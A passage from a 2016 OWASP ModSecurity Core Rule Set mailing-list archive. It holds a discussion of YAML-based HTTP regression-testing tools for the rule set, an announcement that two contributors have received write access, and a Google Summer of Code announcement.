> Cc: owasp-modsecurity-core-rule-set at lists.owasp.org
> Subject: Re: [Owasp-modsecurity-core-rule-set] Paranoia Mode: Forgotten controversial ...
>
> Walter,
>
> This is nice. I have tested many http checkers through the years, but somehow they all sucked. Your choice of YAML looks valid to me, I might give it a go next week or so.
>
> A few feature-related questions :
> - It says it has the ability to consume cookies. Can you delete them
> as  well?
> - Can you load data from an external file (passwords spring to mind)?
> - Can I extract a token from a page and use it on a subsequent request?
> - What is the behaviour with multiple http request headers of the same
> name?
> - Can you control the order of http headers?
> - It follows redirects. But I can't check for the redirect status code?
> - I can't test for the content of a http response header, can I?
> - Can I test for status code _and_ content?
>
> Sorry if this is just nitpicking. I know these are advanced features, but they are the reason I come back to ugly shell/curl hacks after a week with any http checker.
>
> Ahoj,
>
> Christian
>
>
>
> On Fri, Feb 26, 2016 at 10:47:40PM +0100, Walter Hop wrote:
>> I use a little home-built thing to do these kinds of regression tests
>> on our own web services. It walks through a YAML file with tests:
>> http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGFg
>> x
>> vS3v2gRV6ZDw&s=5&u=https%3a%2f%2fgithub%2ecom%2flifeforms%2fhttpcheck
>>
>> I started to write tests for CRSv3, but I didn?t get very far,
>> because I got stuck on the PHP rules issue. Here is the start of my
>> httpcheck manifest with some SQLi tests:
>> http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGFg
>> x vS3q3-FVzIWQ&s=5&u=http%3a%2f%2flf%2ems%2fcrsv3%2eyaml
>> I just do 'httpcheck -i crsv3.yaml -u http://localhost/' to run them on a server.
>>
>> It?s in Go though, because I wanted to test lots of servers
>> concurrently and I wanted it to be fast, so it was a good excuse to
>> try Go. Maybe it?s even a good excuse to learn about its C bindings
>> with libmodsecurity in the future :)
>>
>> Ultimately it could be any tool, I?m not really familiar with the Python world, but I?m in favor of anything that makes it very easy to write a test. Something like just adding a simple line to a file, but with options for doing advanced stuff like POST data, cookies and custom headers. I personally hate writing correct JSON (that trailing comma?) or XML. But I find YAML pretty nice for this case.
>>
>> Cheers!
>> WH
>>
>>> On 22 Feb 2016, at 21:47, Chaim Sanders <CSanders at trustwave.com> wrote:
>>>
>>> You?ll note that I have a ticket for updating the regression tests.
>>> I think that this is something that we should look into more.
>>> Potentially, a framework that leverages Python?s Requests Library?
>>> My strong preference is towards python in these types of things, I
>>> might be convinced into using bash curl. Perl need not apply :-P thoughts?
>>>
>>> On 2/22/16, 3:03 PM, "Christian Folini"
>>> <christian.folini at netnea.com>
>>> wrote:
>>>
>>>> On Mon, Feb 22, 2016 at 07:57:50PM +0000, Chaim Sanders wrote:
>>>>> Actually I?m really shocked about this. But this is why we have a
>>>>> community :).
>>>>
>>>> We desperately need QA for the core rules.
>>>>
>>>> Alternatively, we could also get hold of Walter and dump his brain
>>>> into an analysis engine. His familiarity with all the individual
>>>> rules is most exceptional.
>>>>
>>>> Christian
>>>>
>>>>
>>>> --
>>>> Croyez ceux qui cherchent la v?rit?, doutez de ceux qui la trouvent.
>>>> -- Andr? Gide
>>>
>>>
>>> ________________________________
>>>
>>> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
>>> _______________________________________________
>>> Owasp-modsecurity-core-rule-set mailing list
>>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>>> http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGF
>>> gxvS3q32SAudAw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2fl
>>> istinfo%2fowasp-modsecurity-core-rule-set
>>
>> --
>> Walter Hop | PGP key:
>> http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGFg
>> x vS3q_1QQ3MDA&s=5&u=https%3a%2f%2flifeforms%2enl%2fpgp
>>
>
>> _______________________________________________
>> Owasp-modsecurity-core-rule-set mailing list
>> Owasp-modsecurity-core-rule-set at lists.owasp.org
>> http://scanmail.trustwave.com/?c=4062&d=pbbR1ldGV12U_iMDiY8XX8Z4CqGFg
>> x
>> vS3q32SAudAw&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flist
>> i nfo%2fowasp-modsecurity-core-rule-set
>
>
> --
> mailto:christian.folini at netnea.com
> http://scanmail.trustwave.com/?c=4062&d=mLPT1kicuUFQdjfSZQGRxIQ4dFlWaS
> 6rOnLe4Rq18w&s=5&u=http%3a%2f%2fwww%2echristian-folini%2ech
> twitter: @ChrFolini
> _______________________________________________
> Owasp-modsecurity-core-rule-set mailing list
> Owasp-modsecurity-core-rule-set at lists.owasp.org
> http://scanmail.trustwave.com/?c=4062&d=mLPT1kicuUFQdjfSZQGRxIQ4dFlWaS
> 6rOneLvRzu_g&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flisti
> nfo%2fowasp-modsecurity-core-rule-set
>
> ________________________________
>
> This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

_______________________________________________
Owasp-modsecurity-core-rule-set mailing list Owasp-modsecurity-core-rule-set at lists.owasp.org
http://scanmail.trustwave.com/?c=4062&d=mLPT1kicuUFQdjfSZQGRxIQ4dFlWaS6rOneLvRzu_g&s=5&u=https%3a%2f%2flists%2eowasp%2eorg%2fmailman%2flistinfo%2fowasp-modsecurity-core-rule-set

________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

From CSanders at trustwave.com  Mon Feb 29 17:24:16 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Mon, 29 Feb 2016 17:24:16 +0000
Subject: [Owasp-modsecurity-core-rule-set] New Community Leaders
Message-ID: <DM2PR0701MB12950BFBD3A11AF870D9E919DBBA0@DM2PR0701MB1295.namprd07.prod.outlook.com>

In general the Core Rule Set project has been moving along at a much faster pace in the past few months thanks to increased community involvement. In general I wanted to call out two individuals specifically, although there are MANY others involved and their help is also greatly valued; not only by me but by everyone in the community. As many of you know both Christian Folini (Dune73) and Walter Hop (Lifeforms) have been working extremely hard organizing and committing to various aspects of the upcoming OWASP CRS-3.0.0-RC1 release. In recognition of their support and hard work, I would like to announce that they have been given write-access to the OWASP-CRS GitHub. While we don?t have official titles, I bestow the unofficial title of ?Core Contributor/Developer? upon you both. I?d like to take this opportunity to congratulate both of these gentlemen and thank them for their diligent work. Thank you.

________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.
-------------- next part --------------
An HTML attachment was scrubbed...
URL: <http://lists.owasp.org/pipermail/owasp-modsecurity-core-rule-set/attachments/20160229/7c7eee41/attachment.html>

From christian.folini at netnea.com  Mon Feb 29 19:38:05 2016
From: christian.folini at netnea.com (Christian Folini)
Date: Mon, 29 Feb 2016 20:38:05 +0100
Subject: [Owasp-modsecurity-core-rule-set] New Community Leaders
In-Reply-To: <DM2PR0701MB12950BFBD3A11AF870D9E919DBBA0@DM2PR0701MB1295.namprd07.prod.outlook.com>
References: <DM2PR0701MB12950BFBD3A11AF870D9E919DBBA0@DM2PR0701MB1295.namprd07.prod.outlook.com>
Message-ID: <20160229193805.GB11501@elias>

Thank you very, very Chaim.

I've been with ModSecurity a long time. Last year I decided to
get more involved with the community again. Seeing this pay off
feels very good.

My imminent goal is to bring the paranoia rules into 3.0.0.
But there is plenty of work in the queue afterwards. This is
a spare time job for me. But I'll be glad to help out as
time permits.

Ahoj,

Christian


-- 
The really great person will keep on going and find, sort of, the key, 
underlying principle of the problem. And come up with a beautiful 
elegant solution that works.
-- Steve Jobs

From CSanders at trustwave.com  Mon Feb 29 21:12:13 2016
From: CSanders at trustwave.com (Chaim Sanders)
Date: Mon, 29 Feb 2016 21:12:13 +0000
Subject: [Owasp-modsecurity-core-rule-set] Google Summer of Code
Message-ID: <DM2PR0701MB1295FF5161363D6A2F395103DBBA0@DM2PR0701MB1295.namprd07.prod.outlook.com>

I am extremely excited to announce that the ModSecurity project was selected for Google Summer of Code. Currently we have Felipe and Myself as mentors for the project; If you are interested in being a mentor please let us know. Additionally, there is still time to submit project proposals. If you are interested in submitting an idea please visit: https://github.com/SpiderLabs/ModSecurity/wiki/Ideas-for-Google-Summer-of-Code-2016. MOST IMPORTANTLY, If you know any students you think would be a good fit, please invite them to participate. We are looking forward to a very successful summer!

For more information please visit the following page:
https://summerofcode.withgoogle.com/organizations/5732252600238080/


________________________________

This transmission may contain information that is privileged, confidential, and/or exempt from disclosure under applicable law. If you are not the intended recipient, you are hereby notified that any disclosure, copying, distribution, or use of the information contained herein (including any reliance thereon) is strictly prohibited. If you received this transmission in error, please immediately contact the sender and destroy the material in its entirety, whether in electronic or hard copy format.

